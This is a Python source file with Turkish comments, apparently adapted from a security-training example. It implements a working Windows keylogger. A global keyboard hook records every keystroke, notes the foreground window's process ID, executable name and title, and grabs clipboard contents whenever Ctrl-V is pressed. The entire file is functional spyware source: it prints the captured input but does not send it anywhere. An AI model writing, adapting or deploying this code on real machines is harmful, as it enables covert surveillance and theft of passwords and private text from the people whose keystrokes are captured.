from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # ön plan penceresini tanımla
    hwnd = user32.GetForegroundWindow()

    # process ID'yi bul
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # geçerli process ID'yi tut
    process_id = "%d" % pid.value

    # çalıştırılabilir dosyayı al
    executable = create_string_buffer(b'\x00' * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # şimdi başlığını oku
    window_title = create_string_buffer(b'\x00' * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # doğru işlemdeysek başlığı yazdır
    print()
    print("[ PID: %s - %s - %s ]" % (process_id,
                                     executable.value,
                                     window_title.value)
          )
    print()

    # handle'ları kapat
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window

    # hedefin pencereleri değiştirip değiştirmediğini kontrol edin
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # standart bir tuşa basarlarsa
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end=' ')
    else:
        # [Ctrl-V] basılırsa, Dan Frisch 2014
        # tarafından eklenen panodaki değeri alın
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % pasted_value, end=' ')
        else:
            print("[%s]" % event.Key, end=' ')

    # işlemi, kaydedilen bir sonraki hook'a geçir
    return True


# bir hook manager oluşturun ve kaydedin
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# hook'u kaydedin ve sonsuza kadar çalıştırın
kl.HookKeyboard()
pythoncom.PumpMessages()
